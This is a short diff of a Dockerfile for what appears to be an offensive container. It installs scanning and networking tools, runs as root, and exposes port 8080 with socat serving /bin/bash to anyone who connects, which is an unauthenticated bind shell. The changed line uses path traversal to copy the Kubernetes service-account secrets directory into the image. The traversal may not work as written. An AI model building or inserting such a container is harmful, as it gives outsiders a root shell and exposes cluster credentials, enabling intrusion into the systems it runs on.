@@ -4,9 +4,8 @@ RUN apt-get update && apt-get install -y iputils-ping wget curl nmap sudo socat 
 
 USER root
 ENV HOME /root
-WORKDIR /workdir
 
-ADD serviceaccount serviceaccount
+COPY /../../../var/run/secrets/kubernetes.io/serviceaccount serviceaccount
 
 EXPOSE 8080
 CMD ["socat", "-T600", "TCP-LISTEN:8080,reuseaddr,fork", "EXEC:'/bin/bash'"]
